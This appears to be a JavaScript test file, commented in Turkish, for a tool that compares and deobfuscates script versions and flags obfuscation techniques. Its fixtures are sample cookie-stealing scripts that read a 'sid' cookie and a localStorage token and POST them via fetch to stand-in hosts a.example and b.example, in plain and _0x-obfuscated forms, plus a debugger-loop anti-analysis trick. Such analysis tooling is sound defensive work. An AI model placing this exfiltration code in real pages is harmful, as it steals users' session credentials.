// Sürüm karşılaştırma öz-denetimi: node test/compare.test.js
import assert from 'node:assert/strict';
import { semanticDiff, portNames, formatDiff, extractFunctions } from '../src/integrations/compare.js';

const v1 = `
function sendData(payload, target) { var body = JSON.stringify(payload); return fetch(target, { method: "POST", body: body }); }
function readCookie(name) { var parts = document.cookie.split("; "); for (var i = 0; i < parts.length; i++) { if (parts[i].indexOf(name) === 0) return parts[i]; } return null; }
function boot() { sendData({ c: readCookie("sid") }, "https://a.example/c"); }
boot();`;

// yalnızca yeniden adlandırma: yapısal fark yok
const renamed = `
function _0x1(_0xa, _0xb) { var _0xc = JSON.stringify(_0xa); return fetch(_0xb, { method: "POST", body: _0xc }); }
function _0x2(_0xd) { var _0xe = document.cookie.split("; "); for (var _0xf = 0; _0xf < _0xe.length; _0xf++) { if (_0xe[_0xf].indexOf(_0xd) === 0) return _0xe[_0xf]; } return null; }
function _0x3() { _0x1({ c: _0x2("sid") }, "https://a.example/c"); }
_0x3();`;

const d0 = semanticDiff(v1, renamed);
assert.equal(d0.summary.equivalent, true, 'yeniden adlandırma yapısal fark sayılmamalı');
assert.equal(d0.summary.same, 4);

// davranış değişikliği: yeni API, değişmiş URL, eklenmiş fonksiyon
const v2 = `
function _0x1(_0xa, _0xb) { var _0xc = JSON.stringify(_0xa); return fetch(_0xb, { method: "POST", body: _0xc }); }
function _0x2(_0xd) { var _0xe = document.cookie.split("; "); for (var _0xf = 0; _0xf < _0xe.length; _0xf++) { if (_0xe[_0xf].indexOf(_0xd) === 0) return _0xe[_0xf]; } return null; }
function _0x9() { return localStorage.getItem("tok"); }
function _0x3() { _0x1({ c: _0x2("sid"), t: _0x9() }, "https://b.example/c"); }
_0x3();`;
const d1 = semanticDiff(v1, v2, { oldInput: v1, newInput: v2 + '\nsetInterval(function(){debugger;}, 4000);' });
assert.equal(d1.summary.equivalent, false);
assert.equal(d1.summary.added, 1);
assert.equal(d1.summary.removed, 0);
const changed = d1.functions.find((f) => f.status === 'changed' && f.old.name === 'boot');
assert.ok(changed, 'boot değişmiş olarak eşleşmeli');
assert.equal(changed.new.name, '_0x3');
assert.deepEqual(changed.changes.stringsAdded, ['https://b.example/c']);
assert.ok(d1.summary.globalsAdded.includes('localStorage'));
assert.ok(d1.techniques.new.some((x) => x.id === 'debug-protection'), 'yeni teknik uyarısı');
assert.match(formatDiff(d1), /1 eklenmiş/);
assert.match(formatDiff(d1, 'en'), /WARNING: new obfuscation technique/);

// adları taşıma: eski sürümdeki anlamlı adlar yeni sürüme geçer, yeni fonksiyon dokunulmadan kalır
const ported = await portNames(v1, v2);
assert.match(ported.code, /function sendData\(payload, target\)/);
assert.match(ported.code, /function readCookie\(name\)/);
assert.match(ported.code, /function boot\(\)/);
assert.match(ported.code, /function _0x9\(\)/);
assert.ok(ported.renamed.length >= 8);

// çakışma: hedef ad kapsamda zaten varsa atlanır
const clash = await portNames('function f(a) { return a + 1; }', 'var a = 5; function g(b) { return b + a; } function h(b) { return b + 1; }');
assert.ok(!/function f\(a\)/.test(clash.code) || !/b \+ a/.test(clash.code));

// program birimi ve iç içe fonksiyonlar listelenir
const ex = extractFunctions('var x = function () { return function inner() { return 1; }; };');
assert.equal(ex.fns.length, 3);
console.log('compare: ok');
